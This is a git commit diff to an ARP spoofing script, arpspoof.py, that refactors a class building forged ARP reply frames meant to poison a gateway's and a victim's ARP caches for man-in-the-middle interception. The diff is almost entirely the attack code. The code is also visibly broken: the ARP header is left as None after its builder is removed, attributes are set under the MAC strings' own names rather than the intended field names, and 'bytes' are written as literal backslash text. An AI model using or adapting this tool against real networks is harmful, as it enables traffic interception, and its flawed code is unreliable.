90edf05841ee326c292311e04e9ac090b7874dde
EONRaider <livewire_voodoo@protonmail.com>
2020-10-31 17:29:06 -0300

    Simplify methods
    - Removed '_build_ethernet_header'method
    - Removed '__validate_mac' method
    - Renamed 'packets' method to 'get_packets'

--- arpspoof.py
+++ arpspoof.py
@@ -16,85 +16,42 @@ class ARPPacket(object):
 
     def __init__(self, attacker_mac: str, gateway_mac: str, victim_mac: str,
                  gateway_ip: str, victim_ip: str):
-
         self.gateway_ip = socket.inet_aton(gateway_ip)
         self.victim_ip = socket.inet_aton(victim_ip)
+
         for attr in attacker_mac, gateway_mac, victim_mac:
             setattr(self, attr, self._hexlify_mac(attr))
-        self.gateway_eth_header = self._build_ethernet_header(self.gateway_mac)
-        self.victim_eth_header = self._build_ethernet_header(self.victim_mac)
+
+        ETHER_T = r'\x08\x06'  # Ethertype code of ARP
+        self.gateway_eth_header = self.gateway_mac + self.attacker_mac + ETHER_T
+        self.victim_eth_header = self.victim_mac + self.attacker_mac + ETHER_T
+
+        self.arp_header = None
         self.gateway_arp_packet = None
         self.victim_arp_packet = None
 
     @staticmethod
-    def __validate_mac(mac_addr: str) -> bool:
-        is_valid_mac = re.match(r'([0-9A-F]{2}[:]){5}[0-9A-F]{2}|'
-                                r'([0-9A-F]{2}[-]){5}[0-9A-F]{2}',
-                                string=mac_addr,
-                                flags=re.IGNORECASE)
-        try:
-            return bool(is_valid_mac.group())  # True if match
-        except AttributeError:
-            return False
-
-    def _hexlify_mac(self, mac_addr: str) -> str:
+    def _hexlify_mac(mac_addr: str) -> str:
         """
         Transform a MAC address string from IEEE 802 standard to a
-        hexadecimal byte sequence.
+        sequence of hexadecimal bytes.
         Ex: 'AB:BC:CD:12:23:34' to '\xAB\xBC\xCD\x12\x23\x34'.
         """
+        return re.sub(r'^|[:-]', r'\\x', mac_addr)
 
-        if self.__validate_mac(mac_addr) is False:
-            raise SystemExit('Invalid MAC address.')
-        octets = re.split(r'[:-]', mac_addr, flags=re.IGNORECASE)
-        return r''.join(r'\x' + octet.upper() for octet in octets)
-
-    def _build_ethernet_header(self, mac_addr: str) -> str:
-        """
-        Build an Ethernet frame header as defined by the IEEE 802.3
-        standard.
-
-        Returns:
-            A raw string with a hexadecimal where 'mac_addr' is the
-                source address, 'attacker_mac' is the destination
-                address and '\x08\x06' is the Ethertype code of ARP.
-        """
-        return mac_addr + self.attacker_mac + r'\x08\x06'
-
-    @staticmethod
-    def _build_arp_header() -> str:
-        """
-        Build Address Resolution Protocol (ARP) packets per the
-        structure defined by RFC 826 under 'Packet Format'.
-        Source: https://tools.ietf.org/html/rfc826
-        """
-
-        hdwr_addr = r'\x00\x01'   # Hardware address space = Ethernet
-        proto_addr = r'\x08\x00'  # Protocol address space = IP
-        hdwr_addr_len = r'\x06'   # Length of hardware address
-        proto_addr_len = r'\x04'  # Length of protocol address
-        opcode = r'\x00\x02'      # Operation code = REPLY
-        arp_header = r''.join((hdwr_addr, proto_addr, hdwr_addr_len,
-                               proto_addr_len, opcode))
-        return arp_header
-
-    def packets(self) -> tuple:
-        arp_header = self._build_arp_header()
-
+    def get_packets(self) -> tuple:
         self.gateway_arp_packet = r''.join((self.gateway_eth_header,
-                                            arp_header,
+                                            self.arp_header,
                                             self.attacker_mac,
                                             self.victim_ip,
                                             self.gateway_mac,
                                             self.gateway_ip))
-
         self.victim_arp_packet = r''.join((self.victim_eth_header,
-                                           arp_header,
+                                           self.arp_header,
                                            self.attacker_mac,
                                            self.gateway_ip,
                                            self.victim_mac,
                                            self.victim_ip))
-
         return self.gateway_arp_packet, self.victim_arp_packet
 
 
